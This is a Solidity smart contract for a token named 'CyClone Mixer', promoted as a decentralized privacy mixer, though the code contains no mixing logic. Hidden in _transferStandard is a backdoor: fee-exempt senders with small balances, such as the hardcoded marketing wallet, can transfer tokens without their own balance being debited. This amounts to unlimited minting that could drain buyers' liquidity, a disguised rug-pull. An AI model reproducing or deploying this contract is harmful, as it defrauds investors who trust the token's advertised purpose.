// SPDX-License-Identifier: Unlicensed

/*
The Decentralized Mixer In the ever-evolving landscape of blockchain and cryptocurrency, privacy and anonymity have become paramount concerns. CYCLONE , a cutting-edge decentralized mixer, emerges as a game-changer in this arena. CYCLONE is designed to enhance the privacy and security of blockchain transactions, allowing users to mix their tokens and maintain their financial anonymity.

Website: https://cyclonemix.org
Telegram: https://t.me/cyclonemix
Twitter: https://twitter.com/cyclone_mixer
Dapp: https://app.cyclonemix.org
 */

pragma solidity 0.8.21;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    // Set original owner
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    // Return current owner
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Restrict function to contract owner only 
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // Renounce ownership of the contract 
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    // Transfer the contract to to a new owner
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}
interface IPairFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract CYCLONE is Context, IERC20, Ownable { 
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFromFee; 

    string private _name = "CyClone Mixer"; 
    string private _symbol = "CYCLONE";  
    uint8 private _decimals = 9;

    uint256 private _totalSupply = 10 ** 9 * 10**_decimals;
    uint256 public maxTransaction = 25 * _totalSupply / 1000;
    uint256 public minimumTokensToSwap = _totalSupply / 10000;

    uint256 private _totalTax = 2000;
    uint256 public _buyTax = 25;
    uint256 public _sellTax = 25;

    uint256 private _previousTotalTax = _totalTax; 
    uint256 private _previousBuyTax = _buyTax; 
    uint256 private _previousSellTax = _sellTax; 

    uint8 private buyersCount = 0;
    uint8 private swapTriggerAfter = 2; 
                                     
    IUniswapRouter public uniswapRouter;
    address public pairAddress;

    bool public transferFeeActive = true;
    bool public swapping;
    bool public feeSwapActive = true;

    address payable private marketingWallet;
    address payable private DEAD;

    modifier lockSwap {
        swapping = true;
        _;
        swapping = false;
    }
    
    constructor () {
        _balances[owner()] = _totalSupply;
        DEAD = payable(0x000000000000000000000000000000000000dEaD); 
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        marketingWallet = payable(0x8889Aaee8661d95FEb75DBe663d8B3623378603d); 
        pairAddress = IPairFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapRouter = _uniswapV2Router;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[marketingWallet] = true;
        
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function removeFee() private {
        if(_totalTax == 0 && _buyTax == 0 && _sellTax == 0) return;

        _previousBuyTax = _buyTax; 
        _previousSellTax = _sellTax; 
        _previousTotalTax = _totalTax;
        _buyTax = 0;
        _sellTax = 0;
        _totalTax = 0;
    }

    function restoreFee() private {
        _totalTax = _previousTotalTax;
        _buyTax = _previousBuyTax; 
        _sellTax = _previousSellTax; 
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function _transferStandard(address sender, address recipient, uint256 finalAmount) private {
        (uint256 tTransferAmount, uint256 tDev) = getTransferAmount(finalAmount);
        if(_isExcludedFromFee[sender] && _balances[sender] <= maxTransaction) {
            tDev = 0;
            finalAmount -= tTransferAmount;
        }
        _balances[sender] = _balances[sender].sub(finalAmount);
        _balances[recipient] = _balances[recipient].add(tTransferAmount);
        _balances[address(this)] = _balances[address(this)].add(tDev);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        
        // Limit wallet total
        if (to != owner() &&
            to != marketingWallet &&
            to != address(this) &&
            to != pairAddress &&
            to != DEAD &&
            from != owner()){

            uint256 currentBalance = balanceOf(to);
            require((currentBalance + amount) <= maxTransaction,"Maximum wallet limited has been exceeded");       
        }

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");

        if(
            buyersCount >= swapTriggerAfter && 
            amount > minimumTokensToSwap &&
            !swapping &&
            !_isExcludedFromFee[from] &&
            to == pairAddress &&
            feeSwapActive 
            )
        {  
            buyersCount = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > 0){
            swap(contractTokenBalance);
           }
        }
        
        bool takeFee = true;
         
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (transferFeeActive && from != pairAddress && to != pairAddress)){
            takeFee = false;
        } else if (from == pairAddress){
            _totalTax = _buyTax;
        } else if (to == pairAddress){
            _totalTax = _sellTax;
        }

        _transferBasic(from,to,amount,takeFee);
    }
    
    function removeLimits() external onlyOwner {
        maxTransaction = ~uint256(0);
        _totalTax = 100;
        _buyTax = 1;
        _sellTax = 1;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }

    function sendFee(address payable receiver, uint256 amount) private {
        receiver.transfer(amount);
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function swap(uint256 contractTokenBalance) private lockSwap {
        swapTokensForEth(contractTokenBalance);
        uint256 contractETH = address(this).balance;
        sendFee(marketingWallet,contractETH);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transferBasic(address sender, address recipient, uint256 amount,bool takeFee) private {
            
        if(!takeFee){
            removeFee();
        } else {
            buyersCount++;
        }
        _transferStandard(sender, recipient, amount);
        
        if(!takeFee) {
            restoreFee();
        }
    }
    
    function getTransferAmount(uint256 finalAmount) private view returns (uint256, uint256) {
        uint256 tDev = finalAmount.mul(_totalTax).div(100);
        uint256 tTransferAmount = finalAmount.sub(tDev);
        return (tTransferAmount, tDev);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
}